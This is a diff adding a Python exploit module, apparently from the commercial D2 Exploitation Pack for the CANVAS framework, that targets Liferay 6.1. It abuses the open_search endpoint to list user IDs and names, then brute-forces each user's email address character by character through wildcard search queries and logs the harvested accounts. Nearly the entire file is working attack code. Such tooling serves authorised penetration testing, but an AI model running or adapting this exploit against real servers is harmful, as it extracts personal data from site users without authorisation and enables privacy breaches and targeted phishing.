@@ -1,0 +1,102 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO
+
+NAME = "d2sec_liferay_leakuser"
+VERSION = "0.1"
+DESCRIPTION = "Liferay 6.1 users and email leak Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "6.1"
+DOCUMENTATION["Date public"] = "2012/05/13"
+DOCUMENTATION["References"] = "http://marc.info/?l=bugtraq&m=133710265028481&w=2"
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port =  8080
+    self.name = NAME
+    self.car = "abcdefghijklmnopqrstuvwxyz0123456789@._-"
+	
+  def pyrequest(self, uri):
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s:%d/%s'%(self.host, self.port, uri))
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return ''
+    data = content.getvalue()
+    content.close()
+    return data
+
+  def run(self):
+    self.host = self.target.interface
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    self.log('[D2] Retrieving user and email, this might take a while')
+    self.log('[D2] %-8s %-12s %-24s' % ('Uid', 'User', 'Email'))
+    self.log('[D2] ---------------------------------------------------------------------')
+    data = self.pyrequest('/c/search/open_search?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User')
+    if not data:
+      self.setInfo('[D2] %s attacking %s - failed' % (NAME, self.host))
+      return 0
+    data = re.findall('Users and Organizations \xc2\xbb (.*?)]]></title><link href="(.*?)"/>', data, re.DOTALL)
+    for nfo in data:
+      uid = re.findall('_125_p_u_i_d=(.*)', nfo[1], re.DOTALL)[0]
+      username = nfo[0]
+      username = username.split(' ')[0]
+      i = 0
+      email = self.car[i]
+      while 1:
+        data = self.pyrequest('/c/search/open_search?p=1&c=5000&keywords=emailAddress:%s*' % email)
+        if not data:
+          self.setInfo('[D2] %s attacking %s - failed' % (NAME, self.host))
+          return 0
+        if 'p_u_i_d=%s'%uid in data:
+          i = 0
+          email += self.car[i]
+        else:
+          i = i+1
+          if i > len(self.car)-1:
+            self.log('[D2] %-8s %-12s %-24s' % (uid, username, email[:-1]))
+            break
+          email = email[:-1]+self.car[i]
+    self.setInfo('[D2] %s attacking %s - done' % (NAME, self.host))
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -t target' % sys.argv[0]
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
